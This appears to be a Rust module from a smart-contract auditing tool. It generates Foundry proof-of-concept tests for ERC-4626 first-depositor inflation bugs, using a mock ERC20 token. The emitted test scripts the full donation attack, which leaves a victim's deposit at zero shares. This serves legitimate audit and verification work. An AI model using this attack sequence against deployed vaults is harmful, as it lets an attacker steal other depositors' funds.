//! ERC-4626 inflation / first-depositor family (family 3): `Erc4626Inflation` /
//! `FirstDepositor` / `OracleFirstMintSeeding`.
//!
//! The famous fixed 4-step donation script with a `victimShares == 0`
//! assertion, backed by a canned self-contained `MockERC20`. T2-leaning because
//! the vault's `asset()` wiring (which ctor arg the mock token feeds) is the one
//! `/* FILL */`; everything else is standard ERC-4626 surface and compiles.

use super::{header, PocTemplate};
use crate::context::{PocContext, Tier};
use sluice_findings::Category;

pub struct Erc4626Template;

/// The canonical 18-decimal mock ERC20 Sluice ships, inlined into every 4626 PoC
/// so the harness is self-contained (no external token dependency).
pub const MOCK_ERC20: &str = r#"// Canonical 18-dec mock backing the vault's asset() — shipped by Sluice, self-contained.
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public constant decimals = 18;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address to, uint256 a) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
        balanceOf[f] -= a; balanceOf[to] += a; return true;
    }
}
"#;

impl PocTemplate for Erc4626Template {
    fn applies(&self, cat: Category) -> bool {
        matches!(
            cat,
            Category::Erc4626Inflation | Category::FirstDepositor | Category::OracleFirstMintSeeding
        )
    }

    fn tier(&self, _cx: &PocContext) -> Tier {
        // Always T2: the asset()/ctor wiring is a FILL even when the rest is
        // standard. (Honest: we can't statically know which ctor arg is the asset.)
        Tier::T2
    }

    fn render(&self, cx: &PocContext) -> String {
        let tier = self.tier(cx);
        let mut s = header(cx, tier);
        s.push_str(MOCK_ERC20);
        s.push('\n');

        let target = &cx.contract_ident;
        // Best-effort deposit signature comment from the real Function.signature.
        let deposit_sig = if cx.function.signature.is_empty() {
            "deposit(uint256,address)".to_string()
        } else {
            cx.function.signature.clone()
        };

        // Constructor: we know the mock should be the asset, but not which arg —
        // so emit a FILL'd ctor call that the user points at `address(asset)`.
        let ctor_args = if cx.ctor_args.is_empty() {
            "/* FILL: pass address(asset) if the vault ctor takes the asset */".to_string()
        } else {
            cx.ctor_args_str()
        };

        s.push_str(&format!(
            "contract {target}_erc4626_inflation_PoC is Test {{\n\
             \x20   {target} vault;\n\
             \x20   MockERC20 asset;\n\
             \x20   address attacker = makeAddr(\"attacker\");\n\
             \x20   address victim   = makeAddr(\"victim\");\n\n\
             \x20   function setUp() public {{\n\
             \x20       asset = new MockERC20();\n\
             \x20       // FILL: wire `asset` into the vault constructor (it backs totalAssets()).\n\
             \x20       vault = new {target}({ctor_args});\n\
             \x20       asset.mint(attacker, 1_000 ether);\n\
             \x20       asset.mint(victim,   1_000 ether);\n\
             \x20   }}\n\n\
             \x20   /// First-depositor share-inflation: signature `{deposit_sig}`.\n\
             \x20   function test_first_depositor_inflation_steals_victim_deposit() public {{\n\
             \x20       // 1. attacker is the FIRST depositor: 1 wei -> 1 share.\n\
             \x20       vm.startPrank(attacker);\n\
             \x20       asset.approve(address(vault), type(uint256).max);\n\
             \x20       vault.deposit(1, attacker);\n\
             \x20       // 2. donate directly to the vault to inflate the share price (the bug).\n\
             \x20       asset.transfer(address(vault), 1_000 ether);\n\
             \x20       vm.stopPrank();\n\
             \x20       // 3. victim deposits a real amount; shares round DOWN to zero.\n\
             \x20       vm.startPrank(victim);\n\
             \x20       asset.approve(address(vault), type(uint256).max);\n\
             \x20       uint256 victimShares = vault.deposit(999 ether, victim);\n\
             \x20       vm.stopPrank();\n\
             \x20       // EXPLOIT HYPOTHESIS: victim received 0 shares for a real deposit.\n\
             \x20       assertEq(victimShares, 0, \"victim shares did not round to zero -> not vulnerable\");\n\
             \x20   }}\n\
             }}\n",
        ));

        s
    }
}
